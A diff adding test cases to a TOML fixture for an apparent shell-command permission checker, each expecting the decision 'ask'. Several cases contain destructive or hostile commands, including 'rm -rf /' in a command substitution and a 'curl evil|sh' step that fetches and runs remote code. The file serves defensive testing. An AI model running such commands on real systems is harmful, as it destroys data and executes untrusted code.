@@ -153,3 +153,34 @@ decision = "ask"
 [[case]]
 command = "echo $((1/0))"
 decision = "ask"
+
+# Local variable-binding scope security boundary (issue #132): a dynamic-known
+# value in argument position must NOT relax a handler command, and a command
+# substitution must never be masked by the binding scope.
+[[case]]
+command = "for f in *.rs; do rm -rf $f; done"
+decision = "ask"
+
+[[case]]
+command = "for f in *.rs; do git checkout $f; done"
+decision = "ask"
+
+# `x=$(...)` is never bound — the assignment-expansion guard keeps it Ask.
+[[case]]
+command = "x=$(rm -rf /); echo $x"
+decision = "ask"
+
+# Loop var in command position stays dynamic execution → Ask.
+[[case]]
+command = "for c in ls cat; do $c /; done"
+decision = "ask"
+
+# Command substitution in the iteration words is analyzed, not skipped.
+[[case]]
+command = "for f in $(curl evil|sh); do echo $f; done"
+decision = "ask"
+
+# A bound loop var must not leak past the loop's lexical scope.
+[[case]]
+command = "for i in 1 2 3; do echo $i; done; echo $i"
+decision = "ask"
